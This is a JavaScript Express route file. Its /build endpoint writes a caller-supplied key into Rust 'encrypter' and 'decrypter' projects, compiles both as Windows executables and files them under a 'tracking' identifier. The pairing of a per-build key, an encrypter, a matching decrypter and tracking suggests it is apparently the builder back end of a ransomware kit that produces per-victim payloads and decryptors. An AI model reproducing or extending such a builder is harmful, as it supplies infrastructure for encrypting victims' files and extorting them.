import express from 'express';
import fs from 'fs';
import path from 'path';
import util from 'util';
import child from 'child_process';

const execute = util.promisify(child.exec);

import common from '../utils/common.js';
import regex from '../utils/regex.js';

const router = express.Router();

router.post('/build', async (req, res) => {
    const body = req.body.data;

    if (!fs.existsSync('./_builds')) {
        fs.mkdirSync('./_builds');
    }

    const key = common.strToByte(body.encryption);

    try {
        const file = path.resolve('../encrypter/src/config.rs');
        let config = fs.readFileSync(file, 'utf-8');

        config = regex.arrayU8(config, 'KEY', key);
        fs.writeFileSync(file, config, 'utf-8');
    } catch (e) {
        console.error('failed to write encrypter config - ' + e.message);
        return res.sendStatus(500);
    }

    try {
        const file = path.resolve('../decrypter/src/config.rs');
        let config = fs.readFileSync(file, 'utf-8');

        config = regex.arrayU8(config, 'KEY', key);
        fs.writeFileSync(file, config, 'utf-8');
    } catch (e) {
        console.error('failed to write decrypter config - ' + e.message);
        return res.sendStatus(500);
    }

    try {
        await execute('cargo build --release --target x86_64-pc-windows-msvc', {
            cwd: path.resolve('../encrypter')
        });
    } catch (e) {
        console.error('failed to build encrypter - ' + e.message);
        return res.sendStatus(500);
    }

    try {
        await execute('cargo build --release --target x86_64-pc-windows-msvc', {
            cwd: path.resolve('../decrypter')
        });
    } catch (e) {
        console.error('failed to build decrypter - ' + e.message);
        return res.sendStatus(500);
    }

    const builds = path.resolve('./_builds');

    for (const dir of fs.readdirSync(builds)) {
        if (!dir.startsWith('!!latest-')) {
            continue;
        }

        const oldPath = path.join(builds, dir);
        const newName = dir.replace('!!latest-', '');
        const newPath = path.join(builds, newName);

        fs.renameSync(oldPath, newPath);
    }

    const buildDir = path.join(builds, `!!latest-${body.tracking}`);
    fs.mkdirSync(buildDir);

    fs.renameSync(path.join('../encrypter/target/x86_64-pc-windows-msvc/release/encrypter.exe'), path.join(buildDir, 'encrypter.exe'));
    fs.renameSync(path.join('../decrypter/target/x86_64-pc-windows-msvc/release/decrypter.exe'), path.join(buildDir, 'decrypter.exe'));

    return res.sendStatus(200)
});

export default router;